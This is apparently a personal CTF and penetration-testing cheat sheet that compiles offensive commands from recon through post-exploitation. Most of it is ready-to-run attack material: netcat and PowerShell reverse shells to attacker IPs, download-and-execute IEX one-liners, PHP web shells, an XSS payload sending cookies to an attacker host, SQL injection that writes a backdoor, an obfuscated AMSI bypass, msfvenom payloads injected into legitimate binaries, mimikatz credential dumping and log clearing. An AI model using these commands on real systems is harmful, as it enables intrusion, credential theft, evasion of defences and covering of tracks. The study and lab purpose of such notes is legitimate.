# notes-simple-ctf pentesting-guide | [my HTB profile](https://www.hackthebox.eu/profile/133269)
some notes i gathered online when doing ctf pentesting. Super credit to all pages that have been mentioned.
- https://book.hacktricks.xyz/
- https://sushant747.gitbooks.io/total-oscp-guide/
- https://www.hackingarticles.in/penetration-testing/
- https://guide.offsecnewbie.com/
- https://github.com/swisskyrepo/PayloadsAllTheThings

## 2. Linux basic
[Linux journey](https://linuxjourney.com/) | [Explainshell](https://www.explainshell.com/explain?cmd=grep+password)

    • /bin - basic programs (ls, cd, cat, etc.)
    • /sbin - system programs (fdisk, mkfs, sysctl, etc)
    • /etc - configuration files
    • /tmp - temporary files (typically deleted on boot)
    • /usr/bin - applications (apt, ncat, nmap, etc.)
    • /usr/share - application support and data files
       mkdir -p test/{recon,exploit,report} = create multiple subfolder in test folder

**# Find files**

    which sbd => /usr/share/sbd
    whereis netcat.exe => /usr/bin/netcat /usr/share/man/man1/netcat.1.gz
    locate netcat.exe => /usr/share/windows-resources/netcat.exe
    find / -type f -name *joplin* 2>/dev/null
    find / type f -name netcat* => /usr/bin/netcat
		    			/usr/share/windows-resources/sbd/netcat.exe

**# Service stuff** - [Linux cheat sheet](https://highon.coffee/blog/linux-commands-cheat-sheet/)
    
    sudo apt install ssh
    sudo service ssh start
    sudo systemctl status ssh
    sudo systemctl start ssh - temp start
    sudo systemctl enable/disable ssh - start/disable at boot
    sudo apt remove --purge ssh - remove all files
    sudo dpkg -i app.deb
    sudo apt -f install
    systemctl list-unit-files				#systemctl list unit files and their states
    output >>>>>>>>>	UNIT FILE                                               STATE           VENDOR PRESET
			proc-sys-fs-binfmt_misc.automount                               static          enabled      
			-.mount                                                         generated       enabled      
			boot-efi.mount                                                  generated       enabled      
			dev-hugepages.mount                                             static          enabled     
			ssh.service                                                     enabled         disabled     
			ssh@.service                                                    static          disabled     
			sshd.service                                                    enabled         disabled     
			sslh.service                                                    disabled        disabled   

**# Networking stuff | process control**
	
    lsof -i							    		#Show established connections. 
    macchanger -r wlan0	/ macchanger --mac=10:90:U7:78:TY:RT wlan0  	#Random MAC ID | specific MAC
    macchanger -p wlan0						    	#Restoring the MAC address
    ifconfig eth0 192.168.2.10/24						#Set IP address in Linux.
    ifconfig eth0:1 192.168.2.15/24						#Add IP address to existing network interface
    tcpkill -9 host google.com						#Blocks access to google.com
    echo "1.1.1.1" >> /etc/resolv.conf					#set Cloudflare DNS
    host 192.168.0.1							#Reverse lookup on an IP address
    ps -ef
    ps aux | grep tilix
    kill 1337
    ps -fC tilix
    
**# System Information**

    whoami && id			#id
    who				#currently login users
    last				#last logged in users
    df -h				#disk usage
    mount				#Show mounted drives. 
    history				#recent command
    getent passwd			#list of user
    strings /usr/local/bin/rwinrm	#contents of none text files, e.g. whats in a binary. 
    cat /etc/*-release		#Shows version number. 
    dpkg -l				#installed packages on Debian / .deb based Linux distro. 
	


**# Compression & Decompression**

    zip -r lootfile.zip /lootfile/* || unzip lootfile.zip
    tar cf archive.tar lootfile || tar xf archive.tar
    tar czf archive.tar.gz lootfile || tar xvzf archive.tar.gz
    base64 plain.txt > encode64.txt || base64 -d encode64 > cleartext.txt

**# Text searching**

    echo "I need to try hard" > hello.txt
    echo "haha new line w double redirection" >> hello.txt
    
    grep: re expression(string) => 
    sed: echo "I need to try hard" | sed 's/hard/harder/' => I need to try harder
    cut: cut -d ":" -f 1 /etc/passwd => 	root
						daemon
						bin
						sys
    awk: echo "hello::there::friend" | awk -F "::" '{print $1, $3}' => hello friend

**# Comparing files**

    comm
    diff
    vimdiff
    ctrl-z - run bg
    bg - shell process running background without interrupt
    fg - return process foreground

**# Download / transfer file**

    wget -O fakevil.exe http:github.com/evilfile/evil.exe
    curl -o fakevil.exe http:github.com/evilfile/evil.exe

**# Linux interesting files**

	/etc/passwd 							#Contains local Linux users.
	/etc/shadow 							#Contains local account password hashes.
	/etc/group 							#Contains local account groups.
	/etc/init.d/ 							#Contains service init script
	/etc/hostname 							#System hostname.
	/etc/resolv.conf 						#System DNS servers.
	/etc/profile 							#System environment variables.
	~/.ssh/ 							#SSH keys.
	~/.bash_history 						#Users bash history log.
	/var/log/ 							#Linux system log files are typically stored here.
	/var/adm/ 							#UNIX system log files are typically stored here.
	/var/log/apache2/access.log | /var/log/httpd/access.log 	#Apache access log file typical path.
	/etc/fstab 							#File system mounts. 

## 3. [Basic Powershell for pentester](https://book.hacktricks.xyz/windows/basic-powershell-for-pentesters)

## 4. Practical tool
[PayloadsAllTheThings - Reverse Shell Cheat Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)

**# Python3 simple server**

    python3 -m http.server 9000

**# Remote Desktop**

    kali: rdesktop victimIP -u username -p passwd -g 1024x768 -x 0x80

**# Netcat => connect to ssh server** 

    kali: nc -nv 192.168.0.5 22

**# Listen on tcp/udp**

    victim: nc -lvpn 4444
    kali: nc -nv 192.168.0.5 4444

**# nc transfer file to victim**

    victim: nc -lvpn 4444 > evil.exe
    kali: nc -nv 192.168.0.5 4444 < /root/Desktop/evil.exe

**# nc bind shell**

    victim: nc -nlvp 4444 -e cmd.exe
    kali: nc -nv 192.168.0.5 4444

**# nc rev shell**

    victim: nc -nlvp 4444
    kali: nc -nv 192.168.0.5 4444 -e /bin/bash
    victim: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.7 1234 >/tmp/f	#nc one-liner reverse shell

**# Powershell**

    PS victim: Set-ExecutionPolicy Unrestricted
    PS victim: Get-ExecutionPolicy -> appear "Unrestricted" on PS

**# PS file transfer**

    cmd victim: powershell -c "(new-object System.Net.WebClient).DownloadFile('http://192.168.0.7:80/usr/share/windows-resources/binaries/wget.exe','C:\Users\victim\Desktop\wget.exe')"
    cmd victim: wget.exe -V
    PS victim: IEX (New-Object Net.WebClient).DownloadString('http://192.168.0.7/mini-reverse.ps1')
    PS victim: Invoke-WebRequest -Uri http://10.10.14.18:9000/nc.exe -OutFile nc2.exe

**# PS rev shell**

    cmd victim: powershell -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.0.7',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i =
    $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.T
    ext.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII
    ).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$c
    lient.Close()"
    kali: sudo nc -lnvp 443

**# PS bind shell**

    cmd victim: powershell -c "$listener = New-Object System.Net.Sockets.TcpListener(
    '0.0.0.0',443);$listener.start();$client = $listener.AcceptTcpClient();$stream = $clie
    nt.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $byt
    es.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString
    ($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$str
    eam.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Sto
    p()"
    kali: nc -nv 192.168.0.5 443

**# Powercat**

    PS victim: . .\powercat.ps1
    PS victim: iex (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')
    PS victim: powercat -h

**# PCat file transfer**

    kali: sudo nc -lnvp 443 > receiving_powercat.ps1
    PS victim: powercat -c 192.168.0.7 -p 443 -i C:\Users\victim\powercat.ps1

**# PCat rev shell**

    kali: sudo nc -lvp 443
    PS victim: powercat -c 192.168.0.7 -p 443 -e cmd.exe

**# PCat bind shell**

    PS victim: powercat -l -p 443 -e cmd.exe
    kali: nc 192.168.0.5 443


**# Wireshark**

    net 192.168.0.1/24 => capture traffic on the 192.168.0.1/24 address range:
    tcp.port == 21 => filter tcp on port 21

**# TCPdump**

    kali: sudo tcpdump -r packet_capture.pcap
    kali: sudo tcpdump -n -r packet_capture.pcap | awk -F" " '{print $3}' | sort | uniq -c | head #filter traffic skip DNS,head to view first 10 lines
    sudo tcpdump -n src host 172.16.40.10 -r packet_capture.pcap

# 5. Useful command
[bash live host scanner](https://github.com/faisalfs10x/live_host_port_scanner)

	export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin	#access to more binaries
	python3 -m http.server 9000							#python3 simple server
	python -c 'import pty; pty.spawn("/bin/sh")'					#spawning shell
	echo "imroot ALL=(ALL:ALL) ALL" >> /etc/sudoers					#add user to sudoers
	[victim: nc -lvpn 4444 > receivevil.exe
    [kali: nc -nv 192.168.0.5 4444 < /root/Desktop/sendevil.exe
	netstat -anlp
	find / -perm -u=s -type f 2>/dev/null						#SUID misconfig
	dpkg -l										#install software
	ps aux										#check programs run as root such as mysql, webserver
	nmap -p- -sV -oX a.xml 10.10.10.168; searchsploit --nmap a.xml			#searchsploit to detect vulnerable services
	cls & echo. & for /f "tokens=4 delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name=%a key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on	#oneliner extract all wifi passwd

# 6. Passive Info Gathering

**# [OSINT Framework](https://osintframework.com/) - listing of osint tool**

**# Website recon - find email,location,socmed, phone no, staffname first_initial+last_name, address**

    kali: whois target.com/targetIP
    kali: whois target.com | egrep -w 'Name Server|Registrant Name|Admin Name|Tech Name'

**# Google Hacking - refer ghdb**

    site:megacorpone.com filetype:pdf intitle: "index of" "parent directory"

**# Netcraft - look for subdomain,technology used such as firewall,IDS, server type**

    https://searchdns.netcraft.com :site contains : *.megacorpone.com
    https://sitereport.netcraft.com/?url=www.megacorpone.com

**# Maltego - look for email, phone, socmed, server etc**

**# OSINT**

    github, gitlab, stackoverflow, soundforge -> look for company,user repo, source code, current project, techno used
    https://github.com/megacorpone

**# Shodan - use API** - [shodan guide](https://danielmiessler.com/study/shodan/)

    [shodan guide](https://danielmiessler.com/study/shodan/)
    port: Search by specific port
    net: Search based on an IP/CIDR
    hostname: Locate devices by hostname
    os: Search by Operating System
    city: Locate devices by city
    country: Locate devices by country
    geo: Locate devices by coordinates
    org: Search by organization
    before/after: Timeframe delimiter
    hash: Search based on banner hash
    has_screenshot:true Filter search based on a screenshot being present
    title: Search based on text within the title

    Search Examples
     Apache city:“San Francisco” port:“8080” product:“Apache Tomcat/Coyote JSP engine”

**# [Security Header scanner](https://securityheaders.com/) - analyze HTTP response headers and provide basic analysis target site’s security posture**
**# theHarvaster - gathers emails, names, subdomains, IPs, and URLs**

    sudo theHarvester -d target.com -b google

**# [Socialsearcher](https://www.social-searcher.com) - search engine for social media sites**

**# [Linkedin2username](https://github.com/initstring/linkedin2username) - Generate username lists for companies on LinkedIn**

## 7. Active Information Gathering
[PayloadsAllTheThings - Network Discovery](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Network%20Discovery.md) -> nmap, masscan, netdiscover, responder etc

**# Subdomains Enumeration**
[PayloadsAllTheThings - SubdomainEnum](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Subdomains%20Enumeration.md)

**# DNS Enumeration**

    host-h
    host target.com 

**# Forward Lookup Brute Force**

    more comprehensive wordlists - /usr/share/seclists
    kali: cat brutelist.txt
    www
    ftp
    mail
    owa
    proxy
    router
    kali: for ip in $(cat brutelist.txt); do host $ip.megacorpone.com; done

**# Reverse Lookup Brute Force**

    for ip in $(seq 50 100); do host 10.10.78.$ip; done | grep -v "not found"

**# DNS Zone Transfers**

    kali: dnsrecon -d target.com -t axfr
    kali: dnsenum zonetransfer.me

**# Port Scanning** - [Nmap cheatsheet](https://highon.coffee/blog/nmap-cheat-sheet/#nmap-cheatsheet) | [live host port scanning](https://github.com/faisalfs10x/live_host_port_scanner)

    sudo nmap -sS IP  										#stealth
    nmap -sV -sT -A IP  									#banner, sevice enumeration
    nmap IP --script=smb-os-discovery 								#discover smb OS
    nmap -v -sn 192.168.0.1-254 -oG ping-sweep.txt; grep Up ping-sweep.txt | cut -d " " -f 2 	#discover live machines
    nmap -p 80 192.168.0.1-254 -oG web-sweep.txt; grep open web-sweep.txt | cut -d" " -f2 	#only port 80 live machines
    masscan -p80,8000-8100 --rate 20000 10.0.0.0/8
    nmap -A -oA nmap IP										#OS detection, run default nmap scripts
    nmap -v -p- -sT IP										#more deeply, verbose, all port, full connect scan

**# SMB Enumeration**

    nmap -v -p 139,445 -oG smb.txt 10.11.1.1-254
    nmap -v -p 139, 445 --script=smb-os-discovery 10.11.1.227
    nmap -v -p 139,445 --script=smb-vuln-ms08-067 --script-args=unsafe=1 10.11.1.5
    sudo nbtscan -r 10.11.1.0/24

**# NFS Enumeration**

    nmap -v -p 111 10.11.1.1-254
    nmap -sV -p 111 --script=rpcinfo 10.11.1.1-254 -> find services that may have registered with rpcbind
    nmap -p 111 --script nfs* 10.11.1.72

**# SMTP Enumeration**

    nc -nv 10.11.1.217 25

**# SNMP Enumeration**

    sudo nmap -sU --open -p 161 10.11.1.1-254 -oG open-snmp.txt

## 8. Vuln Scanning
      Nessus
      Nmap -> sudo nmap --script vuln 192.168.0.5

## 9. Wep App attack
[Portswigger learning materials](https://portswigger.net/web-security/all-materials)

**# Web scanning command**	

	sudo dirsearch -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 127.0.0.1 -e php,bak,sql,config,txt,xml
	dirb http://127.0.0.1 -r -o dirb-127.0.0.1.txt		#Not recursive
	gobuster -u http://127.0.0.1 -w /usr/share/seclists/Discovery/Web_Content/common.txt -s '200,204,301,302,307,403,500' -e	
	nikto -host=http://www.megacorpone.com 	
	wfuzz --hc 400,404 -c /usr/share/dirb/wordlists/small.txt http://localhost:8080/FUZZ/intranet.php
	ffuf -c -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -u http://htb/FUZZ
	sslscan localhost:443			#Heartbleed
	
	#WPScan (vp = Vulnerable Plugins, vt = Vulnerable Themes, u = Users)
	wpscan --url http://localhost
	wpscan --url http://localhost --enumerate vp
	wpscan --url http://localhost --enumerate vt
	wpscan --url http://localhost --enumerate u
	
	#Joomscan
	joomscan -u  http://localhost 
	joomscan -u  http://localhost --enumerate-components
	
	curl -i https://www.megacorpone.com/
	curl https://www.megacorpone.com/ -s -L | html2text -width '99' | uniq				#grep just text on page
	curl https://www.megacorpone.com/ -s -L | grep "title\|href" | sed -e 's/^[[:space:]]*//'	#grep title and link
	
	#Can we upload file?
	curl -v -X OPTIONS https://www.megacorpone.com/
	curl -v -X PUT -d '<?php system($_GET["cmd"]); ?>' https://www.megacorpone.com/test/shell.php
	
**# Web Shell:** - [Acunetix web shell](https://www.acunetix.com/websitesecurity/introduction-web-shells/)

	kali: ./weevely.py generate password123 agent.php   				#weevly shell
	kali: ./weevely.py "http://targetsite/agent.php" password123
	
	echo "<?php system($_GET['cmd']); ?>" > webshell.php   				#site/webshell.php?cmd=whoami
	
	Modifying headers:
	echo "<?php system($_SERVER['HTTP_ACCEPT_LANGUAGE']); ?>" > webshell.php        #a bit stealthy lol
	Then intercept:
	GET /vulnsite/webshell.php HTTP/1.1
	Host: 10.10.10.168
	Accept-Language: cat /etc/passwd
	
**# Wappalyzer technology used**

    burpSuite:
    inspect url parameter
    inspect page content
    inspect response headers
    inspect robots.txt & sitemap.xml
    locate admin consoles /manager/html and /phpmyadmin
    
**# Login -> use default cred, guessing, bruteforce,** 

    burpsuite intruder - set_session parameter change every request

**# XSS - [steal cookie/session](https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-stealing-cookies), content injection** - [Portswigger XSS](https://portswigger.net/web-security/cross-site-scripting) | [Portswigger XSS cheatsheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

    <iframe src=http://kaliIP/report height=”0” width=”0”></iframe> -> deliver an XSS payload in input form/text field
    kali: sudo nc -nvlp 80

    steal cookie
    kali: sudo nc -nvlp 80
    <script>new Image().src="http://kaliIP/cool.jpg?output="+document.cookie;</script>  #inject into text field, wait user login or visit site

**# LFI - [include $file;] <-- vulnerable code** - [Portswigger Directory traversal](https://portswigger.net/web-security/file-path-traversal)

    fimap -u "http://127.0.0.1/site.php?test="
    
    /etc/passwd & c:\boot.ini
    menu.php?file=c:\windows\system32\drivers\etc\hosts
    https://insecure-website.com/loadImage?filename=..\..\..\windows\win.ini

*LFI to log poisoning:*

    kali: nc -nv remoteIP 80
    kali: <?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>
    web url: menu.php?file=c:\xampp\apache\logs\access.log&cmd=ipconfig
    
*LFI to php data wrapper:* 	#inject PHP code via LFI vulnerabilities.

    url: menu.php?file=data:text/plain,hello world
    url: menu.php?file=data:text/plain,<?php echo shell_exec("dir") ?>

**# RFI**

    kali: echo "<?php echo shell_exec($_GET['cmd']); ?>" >> evil.txt
    kali: sudo systemctl restart apache2 / python -m SimpleHTTPServer 8989
    kali: sudo nc -nvlp 80
    web url: menu.php?file=http://attackerIP/evil.txt
    web url: menu.php?file=http://attackerIP/evil.txt&cmd=ipconfig

**# SQLi** - [manual-sql-injection-exploitation-step-by-step](https://www.hackingarticles.in/manual-sql-injection-exploitation-step-step/) | [Portswigger SQLi](https://portswigger.net/web-security/sql-injection)

*Column number enum:*

    debug.php?id=1 order by 1 								#use burp repeater to automate find error in response
    debug.php?id=1 union all select 1, 2, 3
    debug.php?id=1 union all select 1, 2, @@version 					#Extracting Data from the Database
    debug.php?id=1 union all select 1, 2, user()
    debug.php?id=1 union all select 1, 2, table_name from information_schema.tables 	#enum db tables and column through the information_schema.
    debug.php?id=1 union all select 1, 2, column_name from information_schema.columns where table_name='users' #enum tables
    debug.php?id=1 union all select 1, username, password from users  			#enum user,passwd 

*SQLi to Code Execution:*

    debug.php?id=1 union all select 1, 2, load_file('C:/Windows/System32/drivers/etc/hosts') 	#read a file using the load_file function
    debug.php?id=1 union all select 1, 2, "<?php echo shell_exec($_GET['cmd']);?>" into OUTFILE 'c:/xampp/htdocs/backdoor.php' 	#INTO OUTFILE function to malicious PHP in server’s web root. 
    visit url: victimIP/backdoor.php?cmd=ipconfig
    
*Automate SQLi with sqlmap:*

    sqlmap -u http://victimIP/debug.php?id=1 -p "id"
    sqlmap -u http://victimIP/debug.php?id=1 -p "id" --dbms=mysql --dump
    sqlmap -u http://victimIP/debug.php?id=1 -p "id" --dbms=mysql --os-shell

## 10. [Finding Exploit](https://sploitus.com/)
[search public exploit](https://book.hacktricks.xyz/search-exploits)

	https://sploitus.com/
	<service_name> [version] exploit
	nmap -p- -sV -oX a.xml 10.10.10.168; searchsploit --nmap a.xml		#searchsploit to detect vulnerable services
	searchsploit apache local
	searchsploit linux 2.6 | grep -i ubuntu | grep local
	site:exploit-db.com remote privilege escalation
	https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#compiling-windows-exploits-on-kali

## 11. NTLM Relay

	Vulnerable if message_signing: disabled:
	# nmap -n -Pn -p 445 --script smbsecurity-mode 10.5.23.0/24
	
	Disable SMB and HTTP in Responder.conf and start Responder:
	# ./Responder.py -I eth0
	
	NTLM Relay to target and extract SAM file:
	# ./ntlmrelayx.py -smb2support -t smb://10.5.23.42
	
	NTLM Relay using socks proxy:
	# ./ntlmrelayx.py -tf targets.txt -smb2support -socks
	
	Configure ProxyChains:
	# vi /etc/proxychains.conf
	[...]
	socks4 127.0.0.1 1080
	
	Access files via SOCKS proxy:
	# proxychains smbclient -m smb3
	'\\10.5.23.42\C$' -W pc05 -U
	Administrator%invalidPwd

## 12. Active Directory
[PayloadsAllTheThings - Active Directory Attacks](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md)

## 13. Linux PrivEsc
[CTF Privilege Escalation with examples](https://github.com/Ignitetechnologies/Privilege-Escalation) | [PayloadsAllTheThings - Linux PrivEsc Technique](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md) | [GTFOBins](https://gtfobins.github.io/)

**[LinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)**

	cd /tmp; curl https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh | sh
	./linpeas.sh -a/-s 					#option -a for CTF only, -s for stealth mode
**[LinEnum](https://github.com/rebootuser/LinEnum)**

	cd /tmp; wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash LinEnum.sh
	cd /tmp; wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O privescc.sh
	./LinEnum.sh -t -k password

**[Linux Exploit Suggester 2](https://github.com/jondonas/linux-exploit-suggester-2)**

	./linux-exploit-suggester.pl
	
	#check browser if got GUI
	echo $DESKTOP_SESSION
	echo $XDG_CURRENT_DESKTOP
	echo $GDMSESSION
	
## 14. Windows PrivEsc  
[Windows elevation of privileges ToC](https://guif.re/windowseop) | [privilege_escalation_windows](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html) | [PayloadsAllTheThings - Windows PrivEsc Technique](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
				
	
**[PowerUp.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)** - [PowerUp usage](https://recipeforroot.com/advanced-powerup-ps1-usage/) | [PowerSploit manual](https://powersploit.readthedocs.io/en/latest/)
			
*[Download & Execute](https://book.hacktricks.xyz/windows/basic-powershell-for-pentesters#download-and-execute)* | [PayloadsAllTheThings - Windows Download and execute methods](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Download%20and%20Execute.md)	

	cmd victim: echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.13:8000/PowerUp.ps1') | powershell -noprofile - 			#From cmd download and execute
	powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000/ipw.ps1')"
	iex (iwr '10.10.14.9:8000/ipw.ps1') 			#From PSv3

*[Base64 Encoded](https://book.hacktricks.xyz/windows/basic-powershell-for-pentesters#base64-kali-and-encodedcommand)*

	kali: echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:9000/9002.ps1')" | iconv --to-code UTF-16LE | base64 -w0
	PS victim: powershell -EncodedCommand <Base64>
	
*PowerUp.ps1 in ctf mode*

	ECHO %Temp%
	PS victim: IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1"			#get from Github or 
	PS victim: powershell -ep bypass
	PS victim: sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) )."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),( "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
	PS victim: Import-Module PowerUp.ps1
	PS victim: . .\PowerUp.ps1
	PS victim: Invoke-AllChecks
	
*PowerUp.ps1 without touching Disk (load module directly into memory)*

	PS C:\> IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Privesc/PowerUp.ps1")
	cd /usr/share/windows-resources/powersploit/Privesc/ | python3 -m http.server 9000		#get from LAN
	PS victim: IEX(New-Object Net.WebClient).DownloadString(‘http://<kali_ip>:9000/PowerUp.ps1’)
	cmd victim: C:\> powershell –exec bypass
	PS C:\> Import-Module PowerUp.ps1
	PS C:\> . .\PowerUp.ps1
	PS C:\> Invoke-AllChecks

**[WinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)**
	
	PS victim: IEX (New-Object Net.WebClient).DownloadString('https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/winPEAS/winPEASexe/winPEAS/bin/Obfuscated%20Releases/winPEASany.exe?raw=true')
	PS victim: . .\winpeas.exe


## 15. Metasploit

**msfvenom**	

	msfvenom -p windows/meterpreter/reverse_https LHOST=10.10.10.160 LPORT=443 -f exe -o https_rev.exe  	#https rev
	msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.160 LPORT=4445 -f exe -o evil2.exe  		#tcp rev
	msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.160 LPORT=4445 -f exe -e x86/shikata_ga_nai -i 9 -x ori_idm.exe -o evil_idm.exe  #payload injection into binary
	msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.10.160 LPORT=443 -f elf > revshell.elf  	#linux revshell
	msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.10.160 LPORT=443 -f raw > rev_shell.php   		#PHP revshell
	
	python3 -m http.server 9000
	PS victim: Invoke-WebRequest -Uri http://10.10.10.160:9000/evil2.exe -OutFile evil2.exe
	
	msf > use exploit/multi/handler
	msf exploit(handler) > set payload windows/meterpreter/reverse_tcp
	payload => windows/meterpreter/reverse_tcp
	msf exploit(handler) > set lhost 10.10.10.160
	lhost => 10.10.10.160
	msf exploit(handler) > set lport 4445
	lport => 4445
	msf exploit(handler) > run

	[*] Started reverse handler on 10.10.10.160:4445
	[*] Starting the payload handler...

	msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST 10.10.10.160;set LPORT 4445;run;"	#multi handler one liner

	cmd victim: evil2.exe
	PS victim: PS C:\windows\temp> . .\evil2.exe
	
**Post-exploitation** - [getting_meterpreter_shell](https://sushant747.gitbooks.io/total-oscp-guide/getting_meterpreter_shell.html)
	
*meterpreter shell:*  [meterpreter cheatsheet](https://www.sans.org/security-resources/sec560/misc_tools_sheet_v1.pdf)

	ps; run migrate -p 1337
	use post/   		 			#tab for completion
	background -l            			#List background sessions
	background -i 1          			#Connect back to a background session
	execute -f c:\\windows\temp\exploit.exe		#run .exe on target
	getsystem					#try privesc thru meterpreter
	keysscan_start; keyscan_dump; keyscan_stop
	
*Privesc thru meterpreter post module:*

	Ctr-z
	Background session 1? [y/N]  y
	use exploit/windows/local/service_permissions
	use post/windows/gather/credentials/vnc
	use post/windows/gather/credentials/gpp
	load mimikatz -> wdigest
	run post/multi/recon/local_exploit_suggester
	run post/windows/gather/smart_hashdump			#Automated dumping of sam file, tries to esc privileges etc
	run post/windows/gather/credential_collector 
	
	run post/windows/gather/win_privs			#show privileges of current user
	run post/windows/gather/local_admin_search_enum
	run post/windows/gather/enum_shares
	run post/windows/gather/enum_snmp
	run post/windows/gather/enum_applications
	run post/windows/gather/enum_logged_on_users
	run post/windows/gather/checkvm
	sessions -l		#show sessions
	sessions -i 1		#connect to it again
	
*Requires administrative rights [rooted]:*

	killav	
	hashdump
	persistence		#(https://www.hackingarticles.in/multiple-ways-to-persistence-on-windows-10-with-metasploit/)
	# using WCE to get cleartext passwd
	cd /usr/share/windows-resources/wce; python3 -m http.server 9000   
	PS victim: Invoke-WebRequest -Uri http://10.10.10.160:9000/wce64.exe -OutFile wce64.exe
	PS victim: . .\wce64.exe -w		#Retrieving user passwords in cleartext 
	meterpreter> run clearlogs | clearev		#clear log
	
	C:\> reg.exe save hklm\sam c:\windows\temp\sam.save
	C:\> reg.exe save hklm\security c:\windows\temp\security.save
	C:\> reg.exe save hklm\system c:\windows\temp\system.save
	# use secretdump.py after transfer 3 files above.
	kali: secretsdump.py -sam sam.save -security security.save -system system.save LOCAL

*[Invoke-Mimikatz PS1:](https://book.hacktricks.xyz/windows/stealing-credentials#invoke-mimikatz)*

	IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
	Invoke-Mimikatz -DumpCreds #Dump creds from memory
	Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "exit"'

*TCP dump via meterpreter:*

	run packetrecorder -li
	run packetrecorder -i 1
	
*TCP dump in kali and sniff via meterpreter:*

	kali: sudo tcpdump -i wlan0 src port 80 or dst port 80 -w port-80.pcap
	kali: sudo tcpdump -i wlan0 -vvv -A | grep "GET"	#grep all GET from the wlan0 interface
	kali: sudo tcpdump -nX -r port-80.pcap			#Print the traffic in hex with ascii interpretation.
	kali: sudo tcpdump tcp -w tcp-traffic.pcap 		#Only record tcp-traffic
	kali meterpreter: use auxiliary/sniffer/psnuffle	sniff passwords and usernames from pop3, imap, ftp, and HTTP GET

*search files:*
	
	search -f config*
	search -f *.sql
	dir /s 	#recursive search
	.ssh:
	.bash_history
	
*sudo crack etc/shadow file:*

	sudo cp /etc/passwd /etc/shadow to kali
	sudo unshadow passwd shadow > hashroot.txt
	john --rules --wordlist=/usr/share/wordlists/rockyou.txt > hashroot.txt

*[Koadic C3 - JScript RAT:](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Post%20Exploitation%20Koadic.md)* - Windows post-exploitation rootkit similar to Meterpreter and Powershell Empire.
	
## 16. Persistence - Rootkit - Backdoor
